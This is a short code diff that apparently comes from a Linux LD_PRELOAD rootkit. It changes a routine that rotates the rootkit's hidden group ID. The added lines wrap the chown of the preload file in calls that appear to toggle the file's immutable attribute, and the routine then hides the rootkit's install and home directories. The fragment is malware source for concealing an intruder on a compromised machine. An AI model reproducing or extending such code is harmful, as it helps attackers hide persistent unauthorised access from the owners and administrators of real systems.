@@ -67,7 +67,9 @@ gid_t changerkgid(int curtime){
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
 #endif
+    doiapath(preloadpath, 0);
     chown_path(preloadpath, newgid);
+    doiapath(preloadpath, 1);
     hidedircontents(INSTALL_DIR, newgid);
     hidedircontents(HOMEDIR, newgid);
 
